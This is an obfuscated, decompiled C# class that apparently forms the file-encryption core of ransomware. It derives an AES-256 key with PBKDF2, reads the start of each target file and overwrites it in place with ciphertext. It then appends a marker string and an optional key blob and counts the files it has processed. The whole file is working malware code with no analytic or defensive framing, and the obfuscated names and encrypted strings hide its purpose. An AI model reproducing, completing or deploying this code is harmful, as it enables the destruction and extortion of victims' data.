using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

public static class pNCPZOFhXOgiy
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] xjeqXDBiuVwBVy(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = bkqHzoVMNLtiI(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes bkqHzoVMNLtiI(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] PLYaACyiXPLfDqos(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (tEjVFvrPgtsm.RrpEvBQBLONZKo == getString_0(107396862))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (tEjVFvrPgtsm.SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(tEjVFvrPgtsm.bDDJFCkjBbYQ, getString_0(107398662) + string_0 + getString_0(107378957) + ex.Message + getString_0(107396548));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool nKguzTWYAHcXu(string NrVjtCgSTarJ, byte[] QaGqIxJvWtgUo, byte[] VLHQPqpLBGisux = null)
	{
		try
		{
			byte[] array = null;
			if (tEjVFvrPgtsm.RrpEvBQBLONZKo == getString_0(107396862))
			{
				array = (tEjVFvrPgtsm.UpNccIaFzBadyA ? Encoding.ASCII.GetBytes(tEjVFvrPgtsm.OEjiexKEqeO(tEjVFvrPgtsm.ueuvoVAMScuH) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378931)) + Convert.ToString(tEjVFvrPgtsm.bQealBkUmzhp) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378931))) : Encoding.ASCII.GetBytes(tEjVFvrPgtsm.OEjiexKEqeO(tEjVFvrPgtsm.ueuvoVAMScuH) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378940)) + Convert.ToString(tEjVFvrPgtsm.bQealBkUmzhp) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378940))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(NrVjtCgSTarJ, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(QaGqIxJvWtgUo, 0, QaGqIxJvWtgUo.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(NrVjtCgSTarJ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!tEjVFvrPgtsm.UpNccIaFzBadyA)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(VLHQPqpLBGisux, 0, VLHQPqpLBGisux.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (tEjVFvrPgtsm.UpNccIaFzBadyA ? Encoding.ASCII.GetBytes(tEjVFvrPgtsm.OEjiexKEqeO(tEjVFvrPgtsm.ueuvoVAMScuH) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378931)) + Convert.ToString(tEjVFvrPgtsm.bQealBkUmzhp) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378931))) : Encoding.ASCII.GetBytes(tEjVFvrPgtsm.OEjiexKEqeO(tEjVFvrPgtsm.ueuvoVAMScuH) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378940)) + Convert.ToString(tEjVFvrPgtsm.bQealBkUmzhp) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378940))));
				FileStream fileStream2 = new FileStream(NrVjtCgSTarJ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(QaGqIxJvWtgUo, 0, QaGqIxJvWtgUo.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(NrVjtCgSTarJ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!tEjVFvrPgtsm.UpNccIaFzBadyA)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(VLHQPqpLBGisux, 0, VLHQPqpLBGisux.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			tEjVFvrPgtsm.DPjjDEUnrYJ++;
		}
		catch (Exception ex)
		{
			if (tEjVFvrPgtsm.SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(tEjVFvrPgtsm.bDDJFCkjBbYQ, getString_0(107398662) + NrVjtCgSTarJ + getString_0(107378890) + ex.Message + getString_0(107396548));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (tEjVFvrPgtsm.UpNccIaFzBadyA ? Encoding.ASCII.GetBytes(tEjVFvrPgtsm.OEjiexKEqeO(tEjVFvrPgtsm.ueuvoVAMScuH) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378931)) + Convert.ToString(tEjVFvrPgtsm.bQealBkUmzhp) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378931))) : Encoding.ASCII.GetBytes(tEjVFvrPgtsm.OEjiexKEqeO(tEjVFvrPgtsm.ueuvoVAMScuH) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378940)) + Convert.ToString(tEjVFvrPgtsm.bQealBkUmzhp) + tEjVFvrPgtsm.OEjiexKEqeO(getString_0(107378940))));
				FileStream fileStream4 = new FileStream(NrVjtCgSTarJ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(QaGqIxJvWtgUo, 0, QaGqIxJvWtgUo.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(NrVjtCgSTarJ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!tEjVFvrPgtsm.UpNccIaFzBadyA)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(VLHQPqpLBGisux, 0, VLHQPqpLBGisux.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static pNCPZOFhXOgiy()
	{
		Strings.CreateGetStringDelegate(typeof(pNCPZOFhXOgiy));
	}
}
